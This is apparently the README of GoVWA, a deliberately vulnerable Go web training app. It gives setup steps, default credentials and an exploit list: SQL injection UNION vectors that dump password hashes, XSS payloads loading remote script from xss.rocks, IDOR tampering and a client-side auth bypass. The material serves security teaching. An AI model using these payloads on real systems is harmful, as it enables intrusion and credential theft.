# GoVWA

GoVWA (Go Vulnerable Web Application) is a web application developed to help the pentester and programmers to learn the vulnerabilities that often occur in web applications which is developed using golang. Vulnerabilities that exist in GoVWA are the most common vulnerabilities found in web applications today. So it will help programmers recognize vulnerabilities before they happen to their application. Govwa can also be an additional application of your pentest lab for learning and teaching.

This was formerly known as <https://github.com/0c34/govwa>, package name
`govwa`, however this doesn't sit well with how Go code is commonly
organised, therefore it was renamed here to
`github.com/ShiftLeftSecurity/shiftleft-go-demo`,
which is also where we store it on GitHub.

# How To Install GoVWA

## Dependencies

- Golang
- MySQL

Set up MySQL as you like, e.g. with MySQL 8 something like this might suffice to have a working account for GoVWA to use:

```
USE mysql;
CREATE USER 'govwa@'localhost' IDENTIFIED BY 'password';
GRANT ALL ON *.* TO 'govwa@'localhost';
FLUSH PRIVILEGES;
```

If successfully installed you would have a directory `go` in your home directory. That directory has three subdirectories (`bin`, `pgk`, `src`). This project should be cloned into `src/github.com/ShiftLeftSecurity/Helloshiftleft-internal`.

Using Go modules dependency resolution should be automatic, simply `GO111MODULE=on go build` should take care of updating the dependencies for you.

Otherwise run the following to install the remaining Go dependencies:

```
go get github.com/go-sql-driver/mysql
go get github.com/gorilla/sessions
go get github.com/julienschmidt/httprouter
```

## GoVWA config

Open the file `./confic/config.json` and update the relevant fields (probably `username` + `password`) according to your mysql installation. You will most likely also want to add a new database with `create database govwa`.

## Run GoVWA

`go run app.go`

Open `http://192.168.56.101:8082/` to access GoVWA and follow the setup instructions to create database and tables

GoVWA users:

|uname|password|
|-----|--------|
|admin|govwaadmin|
|user1|govwauser1|

# Exploits

1. SQLi 1 (`/sqli1`):

User input through cookie `Uid`. Injects user input into WHERE clause of SELECT statement.
Exemplary vector: `1 UNION SELECT 1, uname, pass, 4 FROM Users`

This gets the username and password hash of a given user from the DB.

2. SQLi 2 (`/sqli2`):

User input through url parameter `uid`. Injects user input into the same statement as 1.
Exemplary vector: `1 UNION SELECT 1, uname, pass, 4 FROM Users`

This gets the username and password hash of a given user from the DB.

Also: It is possible to extract other user's information by changing the uid.

3. XSS 1 (`/xss1`):

User input through search term input field. Any input given is rendered into a `<b>` tag without sanitation and therefore executed.
Example: `<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>`

Can also be used with POST.

4. XSS 2 (`/xss2`):

The url parameter `uid` is parsed into a script tag as part of an assignment. One can therefore call functions for example.
Example: `$.getScript("http://xss.rocks/xss.js")`

It is again possible to extract other user's info by changing the uid.

5. IDOR 1 (`/idor1`):

The form parameter `uid` can be used to alter profiles of other users. As long as the cookie `Uid` and the form field `uid` match the request is taken care of and changes are written to the db.

6. IDOR 2 (`/idor2`):

The vulnerability is the same as in `/idor1` but with and added "security" feature. One has to send the MD5 hash of the given uid in order to be allowed to write to other user's profiles.

Disclaimer: The code behaves somewhat weird by breaking if you change the number of characters in `name` or `city` without adding/removing the same amount of characters in `number`.

7. CSA (`/csa`):

No real functionality. Except a green/red bar popping up depending on the response from the backend. If you use a proxy to tamper with the response you get a green bar regardless of your input.

The correct OTP is a value that has the MD5 hash of `a587cd6bf1e49d2c3928d1f8b86f248b`.
